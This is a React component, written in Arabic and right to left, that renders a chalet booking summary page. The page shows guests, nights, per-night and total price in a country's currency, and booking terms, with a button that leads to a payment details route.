import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import {
  MapPin,
  Users,
  CheckCircle2,
  CreditCard,
  Shield,
  Sparkles,
} from "lucide-react";

const Microsite = () => {
  const { country, type, id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading } = useLink(id);
  const countryData = getCountryByCode(country || "");
  
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (!link || !countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground">الرجاء التحقق من الرابط</p>
        </div>
      </div>
    );
  }
  
  const payload = link.payload;
  
  return (
    <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          {/* Header Badge */}
          <div className="text-center mb-8">
            <Badge className="text-lg px-6 py-2 bg-gradient-primary">
              <Shield className="w-4 h-4 ml-2" />
              <span>عقد موثّق ومحمي</span>
            </Badge>
          </div>
          
          {/* Main Card */}
          <Card className="overflow-hidden shadow-elevated">
            {/* Header with Country Colors */}
            <div
              className="h-32 relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20" />
              <div className="absolute bottom-4 right-6 text-white">
                <h1 className="text-3xl font-bold">{payload.chalet_name}</h1>
                <p className="text-lg opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            {/* Content */}
            <div className="p-8">
              {/* Chalet Image Placeholder */}
              <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center">
                <Sparkles className="w-16 h-16 text-muted-foreground" />
              </div>
              
              {/* Details Grid */}
              <div className="grid md:grid-cols-2 gap-6 mb-8">
                <div className="flex items-start gap-3">
                  <MapPin className="w-5 h-5 text-primary mt-1" />
                  <div>
                    <p className="font-semibold mb-1">الموقع</p>
                    <p className="text-muted-foreground text-sm">
                      {payload.chalet_name}
                    </p>
                  </div>
                </div>
                
                <div className="flex items-start gap-3">
                  <Users className="w-5 h-5 text-primary mt-1" />
                  <div>
                    <p className="font-semibold mb-1">عدد الضيوف</p>
                    <p className="text-muted-foreground text-sm">
                      {payload.guest_count} ضيف
                    </p>
                  </div>
                </div>
                
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                  <div>
                    <p className="font-semibold mb-1">المدة</p>
                    <p className="text-muted-foreground text-sm">
                      {payload.nights} ليلة
                    </p>
                  </div>
                </div>
                
                <div className="flex items-start gap-3">
                  <CreditCard className="w-5 h-5 text-primary mt-1" />
                  <div>
                    <p className="font-semibold mb-1">السعر / الليلة</p>
                    <p className="text-muted-foreground text-sm">
                      {formatCurrency(payload.price_per_night, countryData.currency)}
                    </p>
                  </div>
                </div>
              </div>
              
              {/* Total Amount */}
              <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
                <p className="text-sm mb-2 opacity-90">المبلغ الإجمالي</p>
                <p className="text-5xl font-bold mb-2">
                  {formatCurrency(payload.total_amount, countryData.currency)}
                </p>
                <p className="text-sm opacity-80">
                  {payload.price_per_night} × {payload.nights} ليلة
                </p>
              </div>
              
              {/* Terms */}
              <div className="bg-secondary/30 p-4 rounded-lg mb-6">
                <h3 className="font-bold mb-2">شروط الحجز</h3>
                <ul className="text-sm text-muted-foreground space-y-1">
                  <li>• الدفع بالكامل مطلوب لتأكيد الحجز</li>
                  <li>• سياسة الإلغاء: استرداد 50% قبل 7 أيام</li>
                  <li>• الحد الأقصى للضيوف يجب احترامه</li>
                  <li>• التدخين ممنوع داخل الشاليه</li>
                </ul>
              </div>
              
              {/* Payment Button */}
              <Button
                size="lg"
                className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
                onClick={() => navigate(`/pay/${link.id}/details`)}
              >
                <CreditCard className="w-6 h-6 ml-3" />
                <span>ادفع الآن</span>
              </Button>
              
              <p className="text-xs text-center text-muted-foreground mt-4">
                دفع آمن ومحمي بتقنيات التشفير العالمية
              </p>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default Microsite;
